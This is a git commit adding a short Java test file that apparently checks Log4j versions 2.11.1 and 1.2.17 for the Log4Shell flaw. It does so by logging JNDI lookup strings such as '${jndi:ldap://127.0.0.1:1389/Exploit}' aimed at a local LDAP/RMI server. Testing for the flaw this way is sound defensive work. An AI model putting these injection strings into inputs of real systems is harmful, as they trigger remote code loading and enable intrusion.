90b997ce1a21f8e6a4831fccb904e194e0b93e36
standard gitter <4243354+standardgitter@users.noreply.github.com>
2021-12-11 02:30:17 +0800

    Add files via upload

---
+++ log4j2/src/main/java/Log4jTest.java
@@ -0,0 +1,31 @@
+/**
+ * Created by hk on 2021/12/10.
+ */
+
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+
+public class Log4jTest {
+    private static Logger LOG = LogManager.getLogger(Log4jTest.class);
+    public static void main(String[] args) throws Exception {
+        LOG.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
+        LOG.error("${jndi:rmi://127.0.0.1:1099/Exploit}");
+        System.out.println("2.11.1");
+    }
+}
+
+/*
+import org.apache.log4j.BasicConfigurator;
+import org.apache.log4j.Logger;
+public class Log4jTest {
+    private static Logger log = Logger.getLogger(Log4jTest.class);
+    public static void main(String[] args) throws Exception {
+        BasicConfigurator.configure();
+        log.error("${jndi:ldap://127.0.0.1:8080/Exploit}");
+        log.error("${jndi:rmi://127.0.0.1:8080/Exploit}");
+        System.out.println("1.2.17");
+    }
+}
+*/
